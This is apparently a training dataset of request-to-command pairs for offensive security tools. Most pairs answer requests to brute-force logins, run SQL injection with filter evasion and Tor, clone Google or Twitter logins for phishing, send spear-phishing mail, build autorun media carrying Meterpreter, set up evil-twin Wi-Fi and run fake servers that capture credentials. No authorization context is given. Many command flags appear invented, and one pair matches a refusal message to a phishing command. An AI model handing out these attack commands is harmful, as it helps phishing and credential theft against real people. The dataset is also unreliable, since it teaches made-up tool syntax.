{"input": "Brute-force HTTP GET authentication on the login endpoint at http://example.com/login.", "output": "hydra -L users.txt -P passwords.txt http-get http://example.com/login"}
{"input": "Attempt web authentication brute-forcing against http://example.com/login to find valid credentials.", "output": "hydra -L users.txt -P passwords.txt http-get http://example.com/login"}
{"input": "Perform directory enumeration on http://example.com and save the results to a file.", "output": "dirb http://example.com -o output.txt"}
{"input": "Brute-force directories at http://example.com and write the findings to a file.", "output": "dirb http://example.com -o output.txt"}
{"input": "Enumerate directories on http://example.com, brute-forcing with a 100ms delay between requests.", "output": "dirb http://example.com -z 100"}
{"input": "Perform directory brute-forcing against http://example.com and throttle requests with a 100ms delay.", "output": "dirb http://example.com -z 100"}
{"input": "Scan the web server at http://example.com and save the results to an XML file.", "output": "nikto -h http://example.com -output report.xml"}
{"input": "Perform web server scanning on http://example.com, exporting findings as XML.", "output": "nikto -h http://example.com -output report.xml"}
{"input": "Manually test HTTP requests to http://example.com using Burp Suite Repeater.", "output": "java -jar burpsuite.jar --repeater http://example.com"}
{"input": "Perform manual request testing against http://example.com with the Repeater.", "output": "java -jar burpsuite.jar --repeater http://example.com"}
{"input": "Brute-force directory paths on http://example.com, including checks for specific file extensions.", "output": "gobuster dir -u http://example.com -w wordlist.txt -x php,html"}
{"input": "Perform directory enumeration against http://example.com and look for resources with particular extensions.", "output": "gobuster dir -u http://example.com -w wordlist.txt -x php,html"}
{"input": "Perform web reconnaissance on http://example.com and log the site technology fingerprints to a JSON file.", "output": "whatweb --log-json=output.json http://example.com"}
{"input": "Scan http://example.com for web stack details and save the findings as JSON.", "output": "whatweb --log-json=output.json http://example.com"}
{"input": "Test http://example.com for SQL injection using high-risk techniques.", "output": "sqlmap -u http://example.com --risk 3"}
{"input": "Perform advanced SQL injection testing against http://example.com with aggressive methods.", "output": "sqlmap -u http://example.com --risk 3"}
{"input": "Enumerate directories on http://example.com with 50 concurrent threads.", "output": "gobuster dir -u http://example.com -w wordlist.txt -t 50"}
{"input": "Brute-force folder paths on http://example.com using a 50-thread run.", "output": "gobuster dir -u http://example.com -w wordlist.txt -t 50"}
{"input": "Run an automated web vulnerability scan against http://example.com using Burp Suite.", "output": "java -jar burpsuite.jar --scanner http://example.com"}
{"input": "Perform a Burp Suite vulnerability sweep on http://example.com to identify web issues.", "output": "java -jar burpsuite.jar --scanner http://example.com"}
{"input": "Brute-force the WordPress login at http://example.com using passwords.txt.", "output": "wpscan --url http://example.com --passwords passwords.txt"}
{"input": "Attempt WordPress credential guessing against http://example.com with passwords from passwords.txt.", "output": "wpscan --url http://example.com --passwords passwords.txt"}
{"input": "Brute-force the WordPress login form at /wp-login.php.", "output": "hydra -l admin -P passwords.txt http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid'"}
{"input": "Attempt WordPress brute-forcing against /wp-login.php to test credential strength.", "output": "hydra -l admin -P passwords.txt http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid'"}
{"input": "Run all available Nikto plugins to comprehensively scan http://example.com.", "output": "nikto -h http://example.com -Plugins @ALL"}
{"input": "Perform a comprehensive web scan on http://example.com using every Nikto plugin.", "output": "nikto -h http://example.com -Plugins @ALL"}
{"input": "Enumerate directories on http://example.com that require HTTP authentication.", "output": "dirb http://example.com -u user:pass"}
{"input": "Brute-force hidden paths at http://example.com while handling HTTP auth.", "output": "dirb http://example.com -u user:pass"}
{"input": "Compare two HTTP responses for http://example.com using Burp Suite.", "output": "java -jar burpsuite.jar --compare http://example.com"}
{"input": "Perform a response comparison on http://example.com to identify differences.", "output": "java -jar burpsuite.jar --compare http://example.com"}
{"input": "Try bypassing SQLi filters on http://example.com using a tamper script.", "output": "sqlmap -u http://example.com --tamper=space2comment"}
{"input": "Evade SQL injection defenses at http://example.com with a tamper-based approach.", "output": "sqlmap -u http://example.com --tamper=space2comment"}
{"input": "Scan the web server at http://example.com and save the findings in CSV format.", "output": "nikto -h http://example.com -Format csv"}
{"input": "Run a web server scan against http://example.com and output the results as CSV.", "output": "nikto -h http://example.com -Format csv"}
{"input": "Perform a verbose scan of website technologies on http://example.com for web reconnaissance.", "output": "whatweb -v http://example.com"}
{"input": "Do verbose technology fingerprinting against http://example.com to support recon.", "output": "whatweb -v http://example.com"}
{"input": "Scan the WordPress site at http://example.com for vulnerabilities without validating TLS certificates.", "output": "wpscan --url http://example.com --disable-tls-checks"}
{"input": "Assess http://example.com for WordPress issues with TLS verification turned off.", "output": "wpscan --url http://example.com --disable-tls-checks"}
{"input": "Brute-force directories on http://example.com and ignore SSL verification.", "output": "gobuster dir -u http://example.com -w wordlist.txt -k"}
{"input": "Perform directory enumeration against http://example.com while skipping SSL certificate validation.", "output": "gobuster dir -u http://example.com -w wordlist.txt -k"}
{"input": "Silently brute-force directories on http://example.com without verbose output.", "output": "dirb http://example.com -S"}
{"input": "Perform quiet directory enumeration against http://example.com, minimizing noise.", "output": "dirb http://example.com -S"}
{"input": "Enumerate all WordPress plugins on http://example.com.", "output": "wpscan --url http://example.com --enumerate ap"}
{"input": "Perform WordPress plugin scanning against http://example.com to list installed plugins.", "output": "wpscan --url http://example.com --enumerate ap"}
{"input": "Test for SQL injection on http://example.com using the specified cookie.", "output": "sqlmap -u http://example.com --cookie 'session=123'"}
{"input": "Probe http://example.com for SQL injection while sending the specified cookie.", "output": "sqlmap -u http://example.com --cookie 'session=123'"}
{"input": "Test for SQL injection on http://example.com using PUT requests.", "output": "sqlmap -u http://example.com --method PUT"}
{"input": "Probe http://example.com for SQLi via HTTP PUT method.", "output": "sqlmap -u http://example.com --method PUT"}
{"input": "Brute-force directories on http://example.com and ignore 404 responses.", "output": "gobuster dir -u http://example.com -w wordlist.txt -b 404"}
{"input": "Perform directory enumeration against http://example.com while skipping 404 pages.", "output": "gobuster dir -u http://example.com -w wordlist.txt -b 404"}
{"input": "Scan the WordPress site at http://example.com using a random user agent.", "output": "wpscan --url http://example.com --random-agent"}
{"input": "Perform WordPress vulnerability scanning against http://example.com with a randomized user agent.", "output": "wpscan --url http://example.com --random-agent"}
{"input": "Brute-force the HTTP GET login form at /login using username admin and the passwords.txt wordlist, treating 'Invalid' as a failed response.", "output": "hydra -l admin -P passwords.txt http-get-form '/login:username=^USER^&password=^PASS^:Invalid'"}
{"input": "Attempt web form brute-forcing on /login with user admin against passwords.txt, marking 'Invalid' replies as unsuccessful logins.", "output": "hydra -l admin -P passwords.txt http-get-form '/login:username=^USER^&password=^PASS^:Invalid'"}
{"input": "Perform web reconnaissance on http://example.com to identify technologies while suppressing error messages.", "output": "whatweb --no-errors http://example.com"}
{"input": "Scan the tech stack at http://example.com and hide errors during enumeration.", "output": "whatweb --no-errors http://example.com"}
{"input": "Probe http://example.com for SQL injection while routing traffic through Tor.", "output": "sqlmap -u http://example.com --tor"}
{"input": "Assess http://example.com for SQL injection using Tor to stay anonymous.", "output": "sqlmap -u http://example.com --tor"}
{"input": "Enumerate directories on http://example.com by brute-forcing paths through a proxy.", "output": "dirb http://example.com -p proxy:8080"}
{"input": "Through a proxy, brute-force directory listings on http://example.com to find hidden paths.", "output": "dirb http://example.com -p proxy:8080"}
{"input": "Load the custom extension plugin.jar into burpsuite.jar in Burp Suite.", "output": "java -jar burpsuite.jar --extender plugin.jar"}
{"input": "Launch burpsuite.jar and have it use plugin.jar as a custom extension.", "output": "java -jar burpsuite.jar --extender plugin.jar"}
{"input": "Brute-force directories on http://example.com and save the results to a file.", "output": "gobuster dir -u http://example.com -w wordlist.txt -o output.txt"}
{"input": "Perform directory enumeration against http://example.com and write the findings to a file.", "output": "gobuster dir -u http://example.com -w wordlist.txt -o output.txt"}
{"input": "Enumerate all WordPress themes on http://example.com.", "output": "wpscan --url http://example.com --enumerate at"}
{"input": "Scan http://example.com for all WordPress themes.", "output": "wpscan --url http://example.com --enumerate at"}
{"input": "Perform a web server scan against http://example.com and mutate inputs for additional testing.", "output": "nikto -h http://example.com -mutate 1"}
{"input": "Run input mutation testing on the web server at http://example.com during the scan.", "output": "nikto -h http://example.com -mutate 1"}
{"input": "Brute-force directories on http://example.com and filter results by HTTP status codes.", "output": "gobuster dir -u http://example.com -w wordlist.txt -s 200,301"}
{"input": "Perform directory enumeration against http://example.com, keeping only hits matching desired status codes.", "output": "gobuster dir -u http://example.com -w wordlist.txt -s 200,301"}
{"input": "Scan the web server at http://example.com while using evasion to bypass IDS/IPS.", "output": "nikto -h http://example.com -evasion 1"}
{"input": "Perform a web server assessment on http://example.com with techniques to evade IDS/IPS detection.", "output": "nikto -h http://example.com -evasion 1"}
{"input": "Set Burp Suite's target scope to http://example.com for scoped testing.", "output": "java -jar burpsuite.jar --target-scope http://example.com"}
{"input": "Restrict testing to http://example.com by defining it as the scope in Burp Suite.", "output": "java -jar burpsuite.jar --target-scope http://example.com"}
{"input": "Brute-force directories on http://example.com using a custom User-Agent header.", "output": "dirb http://example.com -H 'User-Agent: Mozilla'"}
{"input": "Enumerate hidden paths at http://example.com with a custom user agent.", "output": "dirb http://example.com -H 'User-Agent: Mozilla'"}
{"input": "Test http://example.com for SQL injection, adding a 2-second pause between each request.", "output": "sqlmap -u http://example.com --delay 2"}
{"input": "Perform SQL injection testing against http://example.com with a two-second delay per request.", "output": "sqlmap -u http://example.com --delay 2"}
{"input": "Set up a website attack vector for credential harvesting to support a phishing attack.", "output": "setoolkit -t 1 -a 2"}
{"input": "Prepare a phishing campaign by configuring a website credential harvester.", "output": "setoolkit -t 1 -a 2"}
{"input": "Set up a spear-phishing campaign using a malicious email payload.", "output": "setoolkit -t 1 -a 1"}
{"input": "Kick off configuration for a spear-phishing email attack.", "output": "setoolkit -t 1 -a 1"}
{"input": "Launch the Social Engineering Toolkit to begin social engineering attack setup.", "output": "setoolkit"}
{"input": "Open the Social Engineering Toolkit interface to configure various attack vectors.", "output": "setoolkit"}
{"input": "Create a QR code that redirects victims for a phishing attack.", "output": "setoolkit -t 1 -a 3"}
{"input": "Generate a phishing redirect QR code for a QR code phishing campaign.", "output": "setoolkit -t 1 -a 3"}
{"input": "Generate infectious media for an autorun attack.", "output": "setoolkit -t 1 -a 4"}
{"input": "Prepare an infectious media attack that uses autorun.", "output": "setoolkit -t 1 -a 4"}
{"input": "Brute-force the admin panel login at /admin for the user admin using the passwords.txt wordlist.", "output": "hydra -l admin -P passwords.txt http-post-form '/admin:username=^USER^&password=^PASS^:Invalid'"}
{"input": "Try a web form brute-force against /admin targeting username admin with passwords.txt.", "output": "hydra -l admin -P passwords.txt http-post-form '/admin:username=^USER^&password=^PASS^:Invalid'"}
{"input": "Open the Maltego case file target.case to begin OSINT analysis.", "output": "maltego --casefile target.case"}
{"input": "Load target.case in Maltego for OSINT review and investigation.", "output": "maltego --casefile target.case"}
{"input": "Launch Maltego to perform OSINT and relationship mapping.", "output": "maltego"}
{"input": "Open Maltego for open-source intelligence and relationship mapping.", "output": "maltego"}
{"input": "Launch a Microsoft SQL brute-force attack.", "output": "setoolkit -t 2 -a 1"}
{"input": "Perform database brute-forcing focused on Microsoft SQL credentials.", "output": "setoolkit -t 2 -a 1"}
{"input": "Set up an evil twin access point for Wi-Fi phishing.", "output": "wifiphisher -i wlan0 -a evil_twin"}
{"input": "Create a rogue AP to capture credentials via Wi-Fi phishing.", "output": "wifiphisher -i wlan0 -a evil_twin"}
{"input": "Create a rogue AP named FreeWiFi using the wlan0 interface.", "output": "wifiphisher -i wlan0 --essid FreeWiFi"}
{"input": "Set up a Wi-Fi phishing access point broadcasting FreeWiFi via wlan0.", "output": "wifiphisher -i wlan0 --essid FreeWiFi"}
{"input": "Run a transform to map a person to email addresses for email reconnaissance.", "output": "maltego --transform person_to_email"}
{"input": "Perform email reconnaissance by mapping person entities to their associated email addresses.", "output": "maltego --transform person_to_email"}
{"input": "Start the Metasploit Framework to prepare for social engineering exploits.", "output": "msfconsole"}
{"input": "Open the exploit framework for social engineering work.", "output": "msfconsole"}
{"input": "Set up a fake HTTP login page to capture credentials.", "output": "msfconsole -x 'use auxiliary/server/capture/http'"}
{"input": "Prepare an HTTP credential harvester to collect logins.", "output": "msfconsole -x 'use auxiliary/server/capture/http'"}
{"input": "Set up a mass mailer for a mass phishing campaign.", "output": "setoolkit -t 1 -a 5"}
{"input": "Configure the phishing mass mailer to run a mass phishing operation.", "output": "setoolkit -t 1 -a 5"}
{"input": "Run CUPP interactively to generate targeted wordlists for password profiling.", "output": "cupp -i"}
{"input": "Start an interactive CUPP session to build tailored password lists.", "output": "cupp -i"}
{"input": "Set up a browser autopwn server for client-side attacks.", "output": "msfconsole -x 'use auxiliary/server/browser_autopwn'"}
{"input": "Bring up a browser exploitation autopwn server aimed at client-side attacks.", "output": "msfconsole -x 'use auxiliary/server/browser_autopwn'"}
{"input": "Generate a password wordlist from the target profile file target.txt.", "output": "cupp -w target.txt"}
{"input": "Use password profiling to build a custom wordlist from target.txt.", "output": "cupp -w target.txt"}
{"input": "Launch Wifiphisher to harvest Wi-Fi credentials over wlan0.", "output": "wifiphisher -i wlan0"}
{"input": "Start a Wi-Fi phishing attack to capture credentials using interface wlan0.", "output": "wifiphisher -i wlan0"}
{"input": "Clone the Google login page for a phishing attack.", "output": "setoolkit -t 1 -a 2 -o google"}
{"input": "Create a credential-harvesting page by copying Google\u2019s login.", "output": "setoolkit -t 1 -a 2 -o google"}
{"input": "Export the Maltego graph to graph.xml for further analysis.", "output": "maltego --export graph.xml"}
{"input": "For OSINT analysis, save the current graph as graph.xml.", "output": "maltego --export graph.xml"}
{"input": "Perform Wi-Fi phishing on wlan0 without jamming nearby networks.", "output": "wifiphisher -i wlan0 --nojamming"}
{"input": "Run Wifiphisher in no-jamming mode using wlan0.", "output": "wifiphisher -i wlan0 --nojamming"}
{"input": "Send a spear-phishing email using a custom template.", "output": "setoolkit -t 1 -a 1 -e template1"}
{"input": "Launch a spear-phish campaign with a customized email layout.", "output": "setoolkit -t 1 -a 1 -e template1"}
{"input": "Create infectious media carrying a Meterpreter payload for an Infectious media attack.", "output": "setoolkit -t 1 -a 4 -p meterpreter"}
{"input": "Prepare infectious media with a Meterpreter payload to use in an Infectious media attack.", "output": "setoolkit -t 1 -a 4 -p meterpreter"}
{"input": "Generate a password profiling wordlist using all available profiles.", "output": "cupp -a"}
{"input": "Build password-profiling wordlists from every available profile.", "output": "cupp -a"}
{"input": "Map a domain to its IP addresses for reconnaissance.", "output": "maltego --transform domain_to_ip"}
{"input": "Perform network reconnaissance by translating domains into IPs.", "output": "maltego --transform domain_to_ip"}
{"input": "Prepare a client-side attack exploiting the Windows shortcut vulnerability for social engineering.", "output": "msfconsole -x 'use exploit/windows/browser/ms10_046_shortcut_icon_dllloader'"}
{"input": "Initiate a client-side social engineering test that abuses the Windows shortcut vulnerability.", "output": "msfconsole -x 'use exploit/windows/browser/ms10_046_shortcut_icon_dllloader'"}
{"input": "Create a QR code for a phishing page and save it as qrcode.png.", "output": "setoolkit -t 1 -a 3 -o qrcode.png"}
{"input": "Generate a QR code for QR code phishing and output the image to qrcode.png.", "output": "setoolkit -t 1 -a 3 -o qrcode.png"}
{"input": "For OSINT analysis, import entities from entities.csv into Maltego.", "output": "maltego --import entities.csv"}
{"input": "Load entities.csv into Maltego to bring its entities into the graph for OSINT.", "output": "maltego --import entities.csv"}
{"input": "Set up a fake DNS server for phishing.", "output": "msfconsole -x 'use auxiliary/server/fake_dns'"}
{"input": "Start a fake DNS service to enable DNS spoofing.", "output": "msfconsole -x 'use auxiliary/server/fake_dns'"}
{"input": "Load the phishing email module to conduct a phishing attack using Metasploit.", "output": "msfconsole -x 'use auxiliary/server/phish_email'"}
{"input": "Prepare to send phishing emails through Metasploit for a phishing campaign.", "output": "msfconsole -x 'use auxiliary/server/phish_email'"}
{"input": "Send mass phishing emails to recipients listed in emails.txt.", "output": "setoolkit -t 1 -a 5 -f emails.txt"}
{"input": "Launch a mass phishing campaign using the addresses from emails.txt.", "output": "setoolkit -t 1 -a 5 -f emails.txt"}
{"input": "List the available profiles for wordlist generation to support password profiling.", "output": "cupp -l"}
{"input": "Show all built-in profiles used for password profiling wordlists.", "output": "cupp -l"}
{"input": "Launch a wireless access point attack.", "output": "setoolkit -t 2 -a 2"}
{"input": "Initiate a wireless attack using an access point technique.", "output": "setoolkit -t 2 -a 2"}
{"input": "Launch a captive portal Wi-Fi phishing attack on interface wlan0.", "output": "wifiphisher -i wlan0 --captive-portal"}
{"input": "Perform Wi-Fi phishing with a captive portal over wlan0.", "output": "wifiphisher -i wlan0 --captive-portal"}
{"input": "Run CUPP in quiet mode to perform password profiling with minimal output.", "output": "cupp -q"}
{"input": "Profile likely passwords silently using CUPP, keeping the output minimal.", "output": "cupp -q"}
{"input": "Launch a Wi-Fi phishing attack with the OAuth template.", "output": "wifiphisher -i wlan0 --template oauth"}
{"input": "Perform Wi-Fi phishing using the OAuth template.", "output": "wifiphisher -i wlan0 --template oauth"}
{"input": "I'm sorry, but I can\u2019t help create tasks to clone the Facebook login page for credential harvesting.", "output": "setoolkit -t 1 -a 2 -p facebook"}
{"input": "I can provide high-level guidance on conducting authorized social engineering assessments or setting up a safe lab target you control instead.", "output": "setoolkit -t 1 -a 2 -p facebook"}
{"input": "Send a spear-phishing email that spoofs Gmail.", "output": "setoolkit -t 1 -a 1 -s gmail"}
{"input": "Craft a spear-phish impersonating Gmail to target a user.", "output": "setoolkit -t 1 -a 1 -s gmail"}
{"input": "Map email addresses to their corresponding person entities for email reconnaissance.", "output": "maltego --run-transform email_to_person"}
{"input": "During email recon, pivot from email addresses to identify associated individuals.", "output": "maltego --run-transform email_to_person"}
{"input": "Set up a handler to handle social engineering payloads.", "output": "msfconsole -x 'use exploit/multi/handler'"}
{"input": "Prepare a listener for payload handling during a social engineering engagement.", "output": "msfconsole -x 'use exploit/multi/handler'"}
{"input": "Save the generated password profiling wordlist to wordlist.txt.", "output": "cupp -o wordlist.txt"}
{"input": "Write the output wordlist to wordlist.txt for password profiling.", "output": "cupp -o wordlist.txt"}
{"input": "Enable logging for a Wifiphisher Wi-Fi phishing attack on interface wlan0.", "output": "wifiphisher -i wlan0 --logging"}
{"input": "Kick off a Wi-Fi phishing run on wlan0 and make sure logging is enabled.", "output": "wifiphisher -i wlan0 --logging"}
{"input": "Build infectious media using the custom executable payload.exe.", "output": "setoolkit -t 1 -a 4 -f payload.exe"}
{"input": "Set up an infectious media attack that embeds payload.exe as the malicious file.", "output": "setoolkit -t 1 -a 4 -f payload.exe"}
{"input": "Create a fresh Maltego graph to begin OSINT analysis.", "output": "maltego --graph new"}
{"input": "Start a new graph in Maltego for OSINT analysis.", "output": "maltego --graph new"}
{"input": "Generate a QR code that directs users to http://evil.com.", "output": "setoolkit -t 1 -a 3 -u http://evil.com"}
{"input": "Create a malicious URL QR pointing at http://evil.com for QR code phishing.", "output": "setoolkit -t 1 -a 3 -u http://evil.com"}
{"input": "Configure credential harvesting for a phishing attack targeting 192.168.1.100.", "output": "setoolkit -t 1 -a 2 -i 192.168.1.100"}
{"input": "Prepare to capture credentials via a phishing attack against 192.168.1.100.", "output": "setoolkit -t 1 -a 2 -i 192.168.1.100"}
{"input": "Set up a Wi-Fi phishing attack and force hostname resolution for victims.", "output": "wifiphisher -i wlan0 --force-hostname"}
{"input": "Run a phishing campaign over Wi-Fi that enforces hostname resolution on connected clients.", "output": "wifiphisher -i wlan0 --force-hostname"}
{"input": "Run CUPP with verbose output for debugging during password profiling.", "output": "cupp -v"}
{"input": "Start password profiling and show verbose debug output from CUPP.", "output": "cupp -v"}
{"input": "Send a mass phishing campaign with high-priority delivery.", "output": "setoolkit -t 1 -a 5 -p priority"}
{"input": "Dispatch high-priority phishing emails as part of a mass phishing operation.", "output": "setoolkit -t 1 -a 5 -p priority"}
{"input": "Start a fake SMB server to capture SMB credentials.", "output": "msfconsole -x 'use auxiliary/server/smb_capture'"}
{"input": "Perform credential harvesting by running a fake SMB service to collect logins.", "output": "msfconsole -x 'use auxiliary/server/smb_capture'"}
{"input": "Run Wi\u2011Fi phishing on wlan0 without browser extensions.", "output": "wifiphisher -i wlan0 --noextensions"}
{"input": "Start a phishing attack over wireless interface wlan0 with browser extensions disabled.", "output": "wifiphisher -i wlan0 --noextensions"}
{"input": "Map social profiles to phone numbers to aid social reconnaissance.", "output": "maltego --transform social_to_phone"}
{"input": "For social reconnaissance, correlate social accounts with their phone numbers.", "output": "maltego --transform social_to_phone"}
{"input": "Prepare a fake FTP server for credential harvesting.", "output": "msfconsole -x 'use auxiliary/server/ftp'"}
{"input": "Set up a fake FTP service to capture credentials.", "output": "msfconsole -x 'use auxiliary/server/ftp'"}
{"input": "Map an IP address to its associated domains as part of network reconnaissance.", "output": "maltego --run-transform ip_to_domain"}
{"input": "During network recon, identify domains linked to a given IP address.", "output": "maltego --run-transform ip_to_domain"}
{"input": "Generate a password profiling wordlist for target_profile.", "output": "cupp -t target_profile"}
{"input": "Create a tailored password list for target_profile using its profile.", "output": "cupp -t target_profile"}
{"input": "Send a spear-phishing email attaching the malicious PDF fake.pdf.", "output": "setoolkit -t 1 -a 1 -f fake.pdf"}
{"input": "Deliver fake.pdf as a weaponized attachment in a targeted phishing email.", "output": "setoolkit -t 1 -a 1 -f fake.pdf"}
{"input": "Clone the Twitter login page for credential harvesting during a phishing attack.", "output": "setoolkit -t 1 -a 2 -t twitter"}
{"input": "Duplicate Twitter's sign-in page to capture credentials in a phishing scenario.", "output": "setoolkit -t 1 -a 2 -t twitter"}
{"input": "Generate a numeric-only wordlist for PINs to support password profiling.", "output": "cupp -n"}
{"input": "Create a digits-only PIN wordlist for use in password profiling.", "output": "cupp -n"}
{"input": "Create a phishing QR code and save the image as qrcode.jpg.", "output": "setoolkit -t 1 -a 3 -f qrcode.jpg"}
{"input": "Export the QR code for the phishing test into qrcode.jpg.", "output": "setoolkit -t 1 -a 3 -f qrcode.jpg"}
{"input": "Export the Maltego graph as a PDF report.", "output": "maltego --export pdf"}
{"input": "Generate a PDF from the current Maltego graph for OSINT reporting.", "output": "maltego --export pdf"}
{"input": "Run a Wi-Fi phishing attack on interface wlan0 using dnsmasq for DNS spoofing.", "output": "wifiphisher -i wlan0 --dnsmasq"}
{"input": "Set up phishing over wlan0 and enable dnsmasq-based DNS spoofing.", "output": "wifiphisher -i wlan0 --dnsmasq"}
{"input": "Set up a fake WebDAV server to capture credentials.", "output": "msfconsole -x 'use auxiliary/server/webdav'"}
{"input": "Deploy a WebDAV honeypot for credential harvesting.", "output": "msfconsole -x 'use auxiliary/server/webdav'"}
{"input": "Create infectious media with a custom autorun.inf for the attack.", "output": "setoolkit -t 1 -a 4 -o autorun.inf"}
{"input": "Prepare an infectious media attack and output the autorun.inf file.", "output": "setoolkit -t 1 -a 4 -o autorun.inf"}
{"input": "Set up a fake server to capture NTLM credentials for credential harvesting.", "output": "msfconsole -x 'use auxiliary/server/ntlm_capture'"}
{"input": "Launch an NTLM capture listener to harvest credentials from clients.", "output": "msfconsole -x 'use auxiliary/server/ntlm_capture'"}
{"input": "Launch a Wi\u2011Fi phishing attack on wlan0 using the custom phishing page custom.html.", "output": "wifiphisher -i wlan0 --phishpage custom.html"}
{"input": "Use wlan0 to serve the custom.html phishing page during the Wi\u2011Fi phishing engagement.", "output": "wifiphisher -i wlan0 --phishpage custom.html"}
{"input": "Generate a wordlist with special characters for password profiling.", "output": "cupp -c"}
{"input": "Create a password profiling list that incorporates special characters.", "output": "cupp -c"}
{"input": "Perform a full analysis of ./binary in Radare2.", "output": "r2 -AA ./binary"}
{"input": "Do comprehensive binary analysis against ./binary.", "output": "r2 -AA ./binary"}
{"input": "Launch GDB to debug ./binary.", "output": "gdb ./binary"}
{"input": "Begin binary debugging of ./binary using GDB.", "output": "gdb ./binary"}
{"input": "Analyze firmware.bin for embedded signatures.", "output": "binwalk --signature firmware.bin"}
{"input": "Perform firmware analysis on firmware.bin to detect known signatures.", "output": "binwalk --signature firmware.bin"}
{"input": "Extract embedded files and firmware components from firmware.bin for analysis.", "output": "binwalk -e firmware.bin"}
{"input": "Perform firmware analysis by pulling embedded components out of firmware.bin.", "output": "binwalk -e firmware.bin"}
{"input": "Automate debugging of ./binary using the script script.gdb.", "output": "gdb -q ./binary -x script.gdb"}
{"input": "Run GDB-driven scripted debugging on ./binary with script.gdb.", "output": "gdb -q ./binary -x script.gdb"}
{"input": "Send mass phishing emails through an SMTP server.", "output": "setoolkit -t 1 -a 5 -t smtp"}
{"input": "Launch a mass phishing campaign via an SMTP service.", "output": "setoolkit -t 1 -a 5 -t smtp"}
{"input": "Disassemble binary.elf to view its assembly code.", "output": "objdump -d binary.elf"}
{"input": "Perform binary disassembly on binary.elf.", "output": "objdump -d binary.elf"}
{"input": "Import binary.elf into Ghidra for analysis.", "output": "ghidra -import binary.elf"}
{"input": "Begin binary analysis by importing binary.elf.", "output": "ghidra -import binary.elf"}
{"input": "Launch Ghidra to begin reverse engineering and decompilation.", "output": "ghidra"}
{"input": "Open Ghidra to perform binary decompilation.", "output": "ghidra"}
{"input": "Display the symbol table of binary.elf.", "output": "objdump -t binary.elf"}
{"input": "Perform symbol analysis on binary.elf to list its symbols.", "output": "objdump -t binary.elf"}
{"input": "Open ./binary in Radare2 to start binary analysis.", "output": "r2 ./binary"}
{"input": "Load ./binary into Radare2 for initial analysis.", "output": "r2 ./binary"}
{"input": "Extract strings of at least 8 characters from binary.", "output": "strings -n 8 binary"}
{"input": "Perform string extraction on binary, limiting results to an 8-character minimum.", "output": "strings -n 8 binary"}
{"input": "Trace the library calls made by ./binary.", "output": "ltrace ./binary"}
{"input": "Perform library call tracing on ./binary.", "output": "ltrace ./binary"}
{"input": "Execute IDA Free in batch mode to analyze binary.elf automatically.", "output": "ida64 -B binary.elf"}
{"input": "Automate binary analysis of binary.elf using IDA Free's batch processing.", "output": "ida64 -B binary.elf"}
{"input": "Set up credential harvesting using the custom URL http://example.com for the phishing campaign.", "output": "setoolkit -t 1 -a 2 -u http://example.com"}
{"input": "Configure a phishing credential harvester that uses http://example.com.", "output": "setoolkit -t 1 -a 2 -u http://example.com"}
{"input": "Open binary.elf in IDA Free for binary analysis.", "output": "ida64 binary.elf"}
{"input": "Launch IDA Free and load binary.elf for analysis.", "output": "ida64 binary.elf"}
{"input": "Extract printable strings from the binary file named binary and write them to output.txt.", "output": "strings binary > output.txt"}
{"input": "Perform string extraction on binary and save the findings into output.txt.", "output": "strings binary > output.txt"}
{"input": "Trace system calls made by ./binary.", "output": "strace ./binary"}
{"input": "Perform system call tracing on ./binary to monitor its activity.", "output": "strace ./binary"}
{"input": "Start debugging ./binary in Radare2.", "output": "r2 -d ./binary"}
{"input": "Launch a binary debugging session for ./binary.", "output": "r2 -d ./binary"}
{"input": "Trace the system calls of ./binary and save the output to trace.txt.", "output": "strace -o trace.txt ./binary"}
{"input": "Record system call activity from ./binary into trace.txt for analysis.", "output": "strace -o trace.txt ./binary"}
{"input": "Open the core dump file core with the executable ./binary for analysis in GDB.", "output": "gdb -c core ./binary"}
{"input": "Perform core dump analysis of core against ./binary to inspect the crash state.", "output": "gdb -c core ./binary"}
{"input": "Trace library calls of ./binary and save the output to output.txt.", "output": "ltrace -o output.txt ./binary"}
{"input": "Capture library call activity from ./binary, writing the trace to output.txt.", "output": "ltrace -o output.txt ./binary"}
{"input": "Display the ELF header information for binary.elf for ELF analysis.", "output": "readelf -h binary.elf"}
{"input": "Inspect the ELF header of binary.elf to support ELF analysis.", "output": "readelf -h binary.elf"}
{"input": "List the section headers for binary.elf as part of ELF analysis.", "output": "readelf -S binary.elf"}
{"input": "Show all ELF sections present in binary.elf.", "output": "readelf -S binary.elf"}
{"input": "Open ./binary in write mode for patching.", "output": "r2 -w ./binary"}
{"input": "Prepare to patch ./binary by opening it with write access.", "output": "r2 -w ./binary"}
{"input": "Launch GDB to debug ./binary and pass it the argument arg1.", "output": "gdb --args ./binary arg1"}
{"input": "Open a debugging session in GDB for ./binary with arg1 supplied to the program.", "output": "gdb --args ./binary arg1"}
{"input": "Perform a recursive firmware analysis on firmware.bin.", "output": "binwalk -M firmware.bin"}
{"input": "Recursively analyze the firmware image firmware.bin.", "output": "binwalk -M firmware.bin"}
{"input": "Extract the filesystem from firmware.bin for firmware analysis.", "output": "binwalk -y filesystem firmware.bin"}
{"input": "From firmware.bin, carve out the filesystem to inspect its contents.", "output": "binwalk -y filesystem firmware.bin"}
{"input": "Display full contents of binary sections in binary.elf.", "output": "objdump -s binary.elf"}
{"input": "Perform section analysis by dumping all section data from binary.elf.", "output": "objdump -s binary.elf"}
{"input": "Run the Ghidra script script.py to automate binary analysis.", "output": "ghidra -script script.py"}
{"input": "Use script.py to perform automated analysis of binaries with Ghidra.", "output": "ghidra -script script.py"}
{"input": "Extract all strings, including non-sectioned, from binary.", "output": "strings -a binary"}
{"input": "Do string extraction on binary and include non-sectioned content.", "output": "strings -a binary"}
{"input": "Disassemble binary.elf in Intel syntax.", "output": "objdump -M intel -d binary.elf"}
{"input": "Perform binary disassembly on binary.elf using Intel syntax.", "output": "objdump -M intel -d binary.elf"}
{"input": "Extract printable strings from binary and show their hexadecimal offsets.", "output": "strings -t x binary"}
{"input": "Pull human-readable strings from binary with offset addresses in hex for quick inspection.", "output": "strings -t x binary"}
{"input": "Export decompiled code from Ghidra for binary.elf into output.asm.", "output": "ghidra -export binary.elf output.asm"}
{"input": "Perform a code export of binary.elf, writing the output to output.asm.", "output": "ghidra -export binary.elf output.asm"}
{"input": "Run IDA Free in automated mode against binary.elf.", "output": "ida64 -A binary.elf"}
{"input": "Kick off automated binary analysis on binary.elf with IDA Free.", "output": "ida64 -A binary.elf"}
{"input": "In IDA Free, run the IDC script script.idc against binary.elf for scripted analysis.", "output": "ida64 -S script.idc binary.elf"}
